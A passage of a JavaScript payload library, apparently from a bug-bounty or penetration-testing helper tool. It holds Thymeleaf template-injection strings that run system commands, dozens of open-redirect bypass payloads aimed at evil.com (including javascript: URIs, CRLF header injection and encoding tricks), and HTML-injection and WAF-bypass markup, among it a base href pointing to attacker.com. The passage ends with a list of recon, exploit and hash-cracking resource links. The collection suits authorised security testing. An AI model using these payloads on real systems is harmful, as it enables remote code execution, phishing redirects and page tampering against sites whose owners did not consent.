    { name: "Thymeleaf RCE selection expr", payload: "*{T(java.lang.Runtime).getRuntime().exec('id')}", tag: "thymeleaf" },
    { name: "Thymeleaf RCE read output", payload: "__${T(java.lang.Runtime).getRuntime().exec(new String[]{'id'}).getInputStream()}__", tag: "thymeleaf" }
  ],

  // ===== OPEN REDIRECT =====
  Redirect: [
  // ----- Existing basic payloads -----
  { name: "Protocol //", payload: "//evil.com", tag: "scheme" },
  { name: "Protocol backslash", payload: "/\\evil.com", tag: "scheme" },
  { name: "Https absolute", payload: "https://evil.com", tag: "absolute" },
  { name: "FTP scheme", payload: "ftp://evil.com", tag: "scheme" },
  { name: "Gopher scheme", payload: "gopher://evil.com", tag: "scheme" },
  { name: "Data scheme", payload: "data:text/html,<script>location='//evil.com'</script>", tag: "scheme" },

  // ----- Existing @-based bypasses -----
  { name: "At sign bypass", payload: "https://evil.com@target.com", tag: "bypass" },
  { name: "Hash trick", payload: "https://evil.com#@target.com", tag: "bypass" },
  { name: "Question mark bypass", payload: "https://evil.com?@target.com", tag: "bypass" },
  { name: "Backslash bypass", payload: "https://evil.com\\@target.com", tag: "bypass" },
  { name: "Semicolon bypass", payload: "https://evil.com;@target.com", tag: "bypass" },
  { name: "Null byte bypass", payload: "https://evil.com%00@target.com", tag: "bypass" },
  { name: "Encoded @ sign", payload: "https://evil.com%2F@target.com", tag: "encoding" },
  { name: "Encoded hash", payload: "https://evil.com%23@target.com", tag: "encoding" },
  { name: "Encoded question", payload: "https://evil.com%3F@target.com", tag: "encoding" },

  // ----- Existing double-slash & path traversal -----
  { name: "Double slash after host", payload: "https://evil.com//target.com", tag: "bypass" },
  { name: "Double slash encoded", payload: "https://evil.com%2f%2ftarget.com", tag: "encoding" },
  { name: "Double encoded double slash", payload: "https://evil.com%252f%252ftarget.com", tag: "encoding" },
  { name: "Path traversal (..)", payload: "https://evil.com/..//target.com", tag: "bypass" },
  { name: "Relative path traversal", payload: "//evil.com/../target.com", tag: "bypass" },
  { name: "Encoded path traversal", payload: "https://evil.com%2e%2e%2ftarget.com", tag: "encoding" },

  // ----- Existing subdomain / domain confusion -----
  { name: "Subdomain spoof", payload: "https://evil.com.target.com", tag: "subdomain" },
  { name: "Target as subdirectory", payload: "https://evil.com/target.com", tag: "bypass" },

  // ----- Existing CRLF injection -----
  { name: "CRLF Location injection", payload: "//evil.com%0d%0aLocation: //evil.com", tag: "injection" },
  { name: "CRLF with newline", payload: "//evil.com%0aLocation: //evil.com", tag: "injection" },

  // ----- Existing port-based bypasses -----
  { name: "Port 80 bypass", payload: "https://evil.com:80@target.com", tag: "bypass" },
  { name: "Port 443 bypass", payload: "https://evil.com:443@target.com", tag: "bypass" },

  // ----- Existing advanced parser confusion -----
  { name: "Slashes in userinfo", payload: "https://evil.com//@target.com", tag: "bypass" },
  { name: "Bracket bypass", payload: "https://evil.com[.]target.com", tag: "bypass" },

  // ===== NEW ADDITIONAL PAYLOADS =====

  // --- Whitespace & control characters (break hostname regex) ---
  { name: "Tab in userinfo", payload: "https://evil.com%09@target.com", tag: "whitespace" },
  { name: "Vertical tab in userinfo", payload: "https://evil.com%0b@target.com", tag: "whitespace" },
  { name: "Line feed in userinfo", payload: "https://evil.com%0a@target.com", tag: "whitespace" },
  { name: "Carriage return in userinfo", payload: "https://evil.com%0d@target.com", tag: "whitespace" },

  // --- Encoded schemes & double encoding ---
  { name: "Encoded protocol (https)", payload: "https%3A%2F%2Fevil.com", tag: "encoding" },
  { name: "Double encoded colon", payload: "https%253a%252f%252fevil.com", tag: "encoding" },
  { name: "Mixed case protocol", payload: "hTtPs://evil.com", tag: "case" },

  // --- JavaScript and data URIs (redirect via script) ---
  { name: "javascript: URL", payload: "javascript:location='//evil.com'", tag: "scheme" },
  { name: "javascript: with alert", payload: "javascript:alert('redirect')//", tag: "scheme" },
  { name: "Data URI (base64)", payload: "data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0iLy9ldmlsLmNvbSI8L3NjcmlwdD4=", tag: "scheme" },

  // --- IP / numeric bypasses (when domain is checked) ---
  { name: "Decimal IP", payload: "http://2130706433", tag: "ip" },
  { name: "Hex IP", payload: "http://0x7f000001", tag: "ip" },
  { name: "Octal IP", payload: "http://0177.0.0.1", tag: "ip" },
  { name: "IPv6 localhost", payload: "http://[::1]", tag: "ip" },

  // --- Alternative schemes for whitelist bypass ---
  { name: "WS (WebSocket)", payload: "ws://evil.com", tag: "scheme" },
  { name: "WSS", payload: "wss://evil.com", tag: "scheme" },
  { name: "mailto", payload: "mailto:evil@evil.com", tag: "scheme" },

  // --- Combining @ with encoded slash to confuse ---
  { name: "Encoded slash after @", payload: "https://evil.com%2f%2f@target.com", tag: "bypass" },
  { name: "Double @", payload: "https://evil.com@evil.com@target.com", tag: "bypass" },

  // --- Using backslash in different positions ---
  { name: "Backslash before host", payload: "https://\\evil.com/target.com", tag: "bypass" },
  { name: "Backslash after scheme", payload: "https:/\\/evil.com", tag: "bypass" },

  // --- CRLF with double encoding ---
  { name: "Double encoded CRLF", payload: "//evil.com%250aLocation: //evil.com", tag: "injection" },

  // --- Path traversal with encoded dots and slashes (more variations) ---
  { name: "Encoded dot-dot-slash (double)", payload: "https://evil.com%2e%2e%2f%2e%2e%2f", tag: "encoding" },
  { name: "Multiple ../", payload: "https://evil.com/../../../../target.com", tag: "bypass" },

  // --- Query parameter injection to override host ---
  { name: "Param in query", payload: "https://evil.com?host=target.com", tag: "bypass" },

  // --- Using Unicode / homoglyphs (if supported) ---
  { name: "Unicode dot", payload: "https://evil.com。target.com", tag: "unicode" },
  { name: "Fullwidth colon", payload: "https：//evil.com", tag: "unicode" },
],

  // ===== HTML INJECTION =====
HTMLi: [
    // ---- ORIGINAL ENTRIES (keep as provided) ----

    { name: "Plain markup", payload: "<h1>test</h1>", tag: "markup" },

    // ---- SAFE ADDITIONS (NO XSS) ----

    // ractiurd-branded (safe)
    { name: "heading", payload: "<h1>ractiurd</h1>", tag: "markup" },
    { name: "bold", payload: "<b>ractiurd</b>", tag: "markup" },
    { name: "comment injection", payload: "<!-- ractiurd -->", tag: "markup" },
    { name: "attribute value", payload: '<input value="ractiurd">', tag: "attribute" },
    { name: "div with id", payload: '<div id="ractiurd">content</div>', tag: "markup" },

    // tag closure / breakout (no events)
    { name: "Close div and inject p", payload: "</div><p>injected</p>", tag: "breakout" },
    { name: "Close span and insert img (no event)", payload: '</span><img src="x">', tag: "breakout" },
    { name: "Close input and add hidden", payload: '"><input type="hidden" value="injected">', tag: "breakout" },
    { name: "Break out of style", payload: '</style><p>injected</p>', tag: "breakout" },

    // comment escape (no script)
    { name: "Comment close + markup", payload: "--><h2>injected</h2>", tag: "breakout" },
    { name: "Comment close + img (no event)", payload: "--><img src=x>", tag: "breakout" },

    // attribute injection (no event handlers)
    { name: "Extra attribute", payload: '" x="y"', tag: "attribute" },
    { name: "Double attribute break", payload: '"><div class="injected">', tag: "attribute" },
    { name: "Single quote attribute break", payload: "'><div class='injected'>", tag: "attribute" },

    // plain markup variations
    { name: "Paragraph injection", payload: "<p>paragraph</p>", tag: "markup" },
    { name: "Div with class", payload: '<div class="injected">div</div>', tag: "markup" },
    { name: "Span injection", payload: "<span>span</span>", tag: "markup" },
    { name: "Line break", payload: "<br>", tag: "markup" },
    { name: "Horizontal rule", payload: "<hr>", tag: "markup" },

    // self‑closing tags (non‑script)
    { name: "Empty img (no event)", payload: "<img src=''>", tag: "markup" },
    { name: "Empty input", payload: "<input>", tag: "markup" },

    // HTML entities / encoded injection
    { name: "Encoded angle brackets", payload: "&lt;h1&gt;injected&lt;/h1&gt;", tag: "encoding" },
    { name: "HTML comment with ractiurd", payload: "<!-- ractiurd here -->", tag: "markup" },

    // context‑specific breaks
    { name: "Break out of textarea", payload: "</textarea><p>injected</p>", tag: "breakout" },
    { name: "Break out of title", payload: "</title><h1>injected</h1>", tag: "breakout" },
    { name: "Break out of iframe srcdoc", payload: "</iframe><p>injected</p>", tag: "breakout" },

    // DOM clobbering (no JS)
    { name: "Duplicate id", payload: '<div id="someId">1</div><div id="someId">2</div>', tag: "dom" },
    { name: "Name attribute conflict", payload: '<a name="x">link</a><input name="x">', tag: "dom" },

 

    // ---- WAF BYPASS: encoded angle brackets / quotes ----
    { name: "Hex-encoded H1", payload: "&#x3C;h1&#x3E;ractiurd&#x3C;/h1&#x3E;", tag: "encoding" },
    { name: "Decimal-encoded H1", payload: "&#60;h1&#62;ractiurd&#60;/h1&#62;", tag: "encoding" },
    { name: "Double-encoded angle", payload: "&amp;lt;h1&amp;gt;ractiurd&amp;lt;/h1&amp;gt;", tag: "encoding" },
    { name: "Quote injection (encoded)", payload: "&quot;&gt;&lt;h1&gt;injected&lt;/h1&gt;", tag: "encoding" },
    { name: "Single quote encoded", payload: "&#39;&gt;&lt;h1&gt;injected&lt;/h1&gt;", tag: "encoding" },

    // ---- WAF BYPASS: attribute quoting variations ----
    { name: "Unquoted attribute", payload: '<input value=ractiurd>', tag: "attribute" },
    { name: "Backtick attribute", payload: '<input value=`ractiurd`>', tag: "attribute" },
    { name: "No closing quote + new tag", payload: '<input value="><h1>injected</h1>', tag: "attribute" },
    { name: "Mixed single/double quotes", payload: "<input value='x'><h1>injected</h1>", tag: "attribute" },

    // ---- WAF BYPASS: comment / closing tricks ----
    { name: "Comment escape with extra dash", payload: "--- ><h1>injected</h1>", tag: "breakout" },
    { name: "Comment escape with encoded dash", payload: "--&#45;><h1>injected</h1>", tag: "breakout" },
    { name: "Close and reopen tag", payload: "</h1/><h1>ractiurd</h1>", tag: "breakout" },
    { name: "Close multiple tags", payload: "</div></span><p>injected</p>", tag: "breakout" },

    // ---- HTML5 / rare tags (often whitelisted) ----
    { name: "Details with summary", payload: "<details><summary>ractiurd</summary>content</details>", tag: "html5" },
    { name: "Dialog open", payload: "<dialog open>ractiurd</dialog>", tag: "html5" },
    { name: "Template (inert)", payload: "<template>ractiurd</template>", tag: "html5" },
    { name: "Article section", payload: "<article><section>ractiurd</section></article>", tag: "html5" },
    { name: "Nav injection", payload: "<nav>ractiurd</nav>", tag: "html5" },

    // ---- WAF BYPASS: non‑event SVG / MathML ----
    { name: "SVG circle (no event)", payload: '<svg><circle cx="50" cy="50" r="40"/></svg>', tag: "svg" },
    { name: "MathML (no event)", payload: '<math><mi>ractiurd</mi></math>', tag: "mathml" },

    // ---- WAF BYPASS: meta / link / base (no JS) ----
    { name: "Meta refresh (0s, no URL)", payload: '<meta http-equiv="refresh" content="0">', tag: "meta" },
    { name: "Base href change", payload: '<base href="//attacker.com">', tag: "bypass" },
    { name: "Link stylesheet (external)", payload: '<link rel="stylesheet" href="x.css">', tag: "link" },

    // ---- WAF BYPASS: style / inline CSS (no expression) ----
    { name: "Style block (color)", payload: '<style>body{color:red}</style>', tag: "css" },
    { name: "Inline style (no JS)", payload: '<div style="color:red;display:none">ractiurd</div>', tag: "css" },

    // ---- Context‑specific breakout (safe) ----
    { name: "Break out of textarea (safe)", payload: "</textarea><h1>injected</h1>", tag: "breakout" },
    { name: "Break out of title (safe)", payload: "</title><h1>injected</h1>", tag: "breakout" },
    { name: "Break out of style block (safe)", payload: "</style><h1>injected</h1>", tag: "breakout" },
    { name: "Break out of iframe srcdoc (safe)", payload: "</iframe><p>injected</p>", tag: "breakout" },

    // ---- WAF BYPASS: empty / self‑closing oddities ----
    { name: "Self-closing div", payload: "<div />", tag: "markup" },
    { name: "Tag with slash before >", payload: "<img src=x/>", tag: "markup" },
    { name: "Multiple slashes", payload: "<img//src=x//>", tag: "waf_bypass" },
    { name: "Tag with encoded slash", payload: "<img src=x&#47;>", tag: "encoding" },

    // ---- ractiurd‑branded WAF bypass tests ----
    { name: "ractiurd mixed-case", payload: "<H1>ractiurd</H1>", tag: "waf_bypass" },
    { name: "ractiurd with null byte", payload: "<ractiurd%00>", tag: "waf_bypass" },
    { name: "ractiurd in comment", payload: "<!-- ractiurd -->", tag: "markup" },
    { name: "ractiurd as attribute value (unquoted)", payload: '<div class=ractiurd>', tag: "attribute" }
],

  // ===== USEFUL LINKS (click opens in a new tab) =====
// ===== USEFUL LINKS (click opens in a new tab) =====
Links: [
  // ===== BUG BOUNTY HELPER (Actionable Dorks & APIs) =====
  { name: "VT Domain Report (API)", payload: "https://www.virustotal.com/vtapi/v2/domain/report?apikey=YOUR_API_KEY&domain=target.com", tag: "bugbounty" },
  { name: "Favicon Hash Lookup", payload: "https://favicon-hash.kmsec.uk/", tag: "bugbounty" },
  { name: "Censys Favicon Dork", payload: "https://search.censys.io/search?q=services.http.response.favicons.md5_hash%3AXXXXXXXXXXX", tag: "bugbounty" },
  { name: "ZoomEye (Search Engine)", payload: "https://www.zoomeye.hk/", tag: "bugbounty" },
  { name: "urlscan Domain Search", payload: "https://urlscan.io/search/#domain%3Atarget.com", tag: "bugbounty" },
  { name: "Wayback CDX API (Subdomains)", payload: "https://web.archive.org/cdx/search/cdx?url=*.target.com&fl=original&collapse=urlkey", tag: "bugbounty" },
  { name: "OTX Domain URLs (API)", payload: "https://otx.alienvault.com/api/v1/indicators/domain/target.com/url_list?limit=100", tag: "bugbounty" },
  { name: "crt.sh Wildcard Search", payload: "https://crt.sh/?q=%25.target.com", tag: "bugbounty" },
  { name: "SecurityTrails Apex Domain", payload: "https://securitytrails.com/list/apex_domain/target.com", tag: "bugbounty" },
  { name: "Shodan SSL CN Dork", payload: "https://www.shodan.io/search?query=ssl.cert.subject.CN%3A%22target.com%22", tag: "bugbounty" },
  { name: "TakSec Dorks", payload: "https://taksec.github.io/google-dorks-bug-bounty/", tag: "bugbounty" },
  { name: "Google Hacking Database", payload: "https://www.exploit-db.com/google-hacking-database", tag: "bugbounty" },
,

  // ===== RECON =====
  { name: "Whoxy", payload: "https://www.whoxy.com/", tag: "recon" },
  { name: "ViewDNS", payload: "https://viewdns.info/", tag: "recon" },
  { name: "BGP HE", payload: "https://bgp.he.net/", tag: "recon" },
  { name: "BGPView", payload: "https://bgpview.io/", tag: "recon" },
  { name: "Netlas", payload: "https://app.netlas.io/", tag: "recon" },
  { name: "FOFA", payload: "https://en.fofa.info/", tag: "recon" },
  { name: "PublicWWW", payload: "https://publicwww.com/", tag: "recon" },
  { name: "Phonebook.cz", payload: "https://phonebook.cz/", tag: "recon" },
  { name: "DNSlytics", payload: "https://dnslytics.com/", tag: "recon" },
  { name: "BuiltWith", payload: "https://builtwith.com/", tag: "recon" },
  { name: "Censys", payload: "https://search.censys.io/", tag: "recon" },
  { name: "Shodan", payload: "https://www.shodan.io/", tag: "recon" },

  // ===== EXPLOITS =====
  { name: "Exploit-DB", payload: "https://www.exploit-db.com/", tag: "exploits" },
  { name: "CXSecurity", payload: "https://cxsecurity.com/", tag: "exploits" },
  { name: "SecLists (Wordlists)", payload: "https://github.com/danielmiessler/SecLists", tag: "exploits" },
  { name: "GTFOBins", payload: "https://gtfobins.github.io/", tag: "exploits" },
  { name: "LOLBAS (Windows)", payload: "https://lolbas-project.github.io/", tag: "exploits" },

  // ===== RESEARCH (CVE / Vulnerabilities) =====
  { name: "AttackerKB", payload: "https://attackerkb.com/", tag: "research" },
  { name: "NVD", payload: "https://nvd.nist.gov/", tag: "research" },
  { name: "CVE Details", payload: "https://www.cvedetails.com/", tag: "research" },
  { name: "VulnCheck KEV", payload: "https://vulncheck.com/kev", tag: "research" },

  // ===== LEARN =====
  { name: "PortSwigger Academy", payload: "https://portswigger.net/web-security", tag: "learn" },
  { name: "OWASP", payload: "https://owasp.org/", tag: "learn" },
  { name: "HackTricks", payload: "https://book.hacktricks.xyz/", tag: "learn" },
  { name: "PayloadsAllTheThings", payload: "https://github.com/swisskyrepo/PayloadsAllTheThings", tag: "learn" },
  { name: "Security Idiots", payload: "http://www.securityidiots.com/", tag: "learn" },
  { name: "SQLNinja", payload: "http://leettime.net/sqlninja.com/", tag: "learn" },
  { name: "HackerOne Hacktivity", payload: "https://hackerone.com/hacktivity", tag: "learn" },
  { name: "Bugcrowd Hacktivity", payload: "https://bugcrowd.com/hacktivity", tag: "learn" },
  { name: "PentesterLand", payload: "https://pentesterland.com/", tag: "learn" },
  { name: "Infosec Writeups", payload: "https://infosecwriteups.com/", tag: "learn" },

  // ===== CRYPTO =====
  { name: "HashKiller MD5", payload: "https://hashkiller.co.uk/md5-decrypter.aspx", tag: "crypto" },
  { name: "HashKiller SHA1", payload: "https://hashkiller.co.uk/sha1-decrypter.aspx", tag: "crypto" },
  { name: "hexsploit hashid", payload: "https://www.hexsploit.web.id/index?tools=hashid", tag: "crypto" },
  { name: "endecoder", payload: "https://endecoder.hexsploit.web.id/", tag: "crypto" },
  { name: "JWT.io (Debugger)", payload: "https://jwt.io/", tag: "crypto" },
  { name: "dCode (Ciphers)", payload: "https://www.dcode.fr/", tag: "crypto" },
  { name: "Decrypt (Hash Tool)", payload: "https://decrypt.cc/", tag: "crypto" },

  // ===== TOOLS =====
  { name: "CyberChef (All-in-one)", payload: "https://gchq.github.io/CyberChef/", tag: "tools" },
  { name: "SecurityHeaders", payload: "https://securityheaders.com/", tag: "tools" },
  { name: "Mozilla Observatory", payload: "https://observatory.mozilla.org/", tag: "tools" },

  // ===== GITHUB =====
  { name: "GitHub", payload: "https://github.com/", tag: "github" },
  { name: "GitHub Code Search", payload: "https://github.com/search", tag: "github" },
  { name: "GitHub Gists", payload: "https://gist.github.com/", tag: "github" },
  { name: "GitHub Dorks", payload: "https://github.com/techgaun/github-dorks", tag: "github" },
  { name: "TruffleHog Regexes", payload: "https://github.com/trufflesecurity/trufflehog", tag: "github" },

  // ===== API =====
  { name: "Postman (API Testing)", payload: "https://www.postman.com/", tag: "api" },
  { name: "Swagger Editor", payload: "https://editor.swagger.io/", tag: "api" },
  { name: "GraphQL Voyager", payload: "https://graphql-kit.com/graphql-voyager/", tag: "api" },
  { name: "JSON Formatter", payload: "https://jsonformatter.org/", tag: "api" },

  // ===== OSINT =====
  { name: "Dehashed (Leaks)", payload: "https://dehashed.com/", tag: "osint" },
  { name: "Have I Been Pwned", payload: "https://haveibeenpwned.com/", tag: "osint" },
  { name: "IntelX", payload: "https://intelx.io/", tag: "osint" },
  { name: "Hunter.io", payload: "https://hunter.io/", tag: "osint" },
  { name: "EmailRep", payload: "https://emailrep.io/", tag: "osint" },

  // ===== CLOUD =====
  { name: "GrayHatWarfare (Buckets)", payload: "https://buckets.grayhatwarfare.com/", tag: "cloud" },
  { name: "AWS IP Ranges", payload: "https://ip-ranges.amazonaws.com/ip-ranges.json", tag: "cloud" },
  { name: "Google Cloud IP Ranges", payload: "https://www.gstatic.com/ipranges/cloud.json", tag: "cloud" },
  { name: "Azure IP Ranges", payload: "https://www.microsoft.com/en-us/download/details.aspx?id=56519", tag: "cloud" },

  // ===== JAVASCRIPT / SOURCE =====
  { name: "JSBeautifier", payload: "https://beautifier.io/", tag: "js" },
  { name: "Prettier Playground", payload: "https://prettier.io/playground/", tag: "js" },
  { name: "Decompiler", payload: "https://www.decompiler.com/", tag: "js" },
  { name: "Sourcegraph", payload: "https://sourcegraph.com/search", tag: "js" },
],
};

export const CATEGORIES = Object.keys(PAYLOADS);